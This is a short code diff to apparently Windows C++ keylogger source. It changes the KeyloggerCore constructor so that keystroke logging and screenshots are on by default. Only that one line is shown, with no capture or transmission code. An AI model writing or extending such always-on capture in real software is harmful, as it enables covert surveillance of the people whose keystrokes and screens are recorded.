@@ -4,7 +4,7 @@
 #include <vector>
 #include <gdiplus.h>
 
-KeyloggerCore::KeyloggerCore() : running(false), logging(false), screenshots(false), stopThread(false), topLeftX(-1), topLeftY(-1), botRightX(-1), botRightY(-1) {}
+KeyloggerCore::KeyloggerCore() : running(false), logging(true), screenshots(true), stopThread(false), topLeftX(-1), topLeftY(-1), botRightX(-1), botRightY(-1) {}
 
 KeyloggerCore::~KeyloggerCore() { stop(); }
 
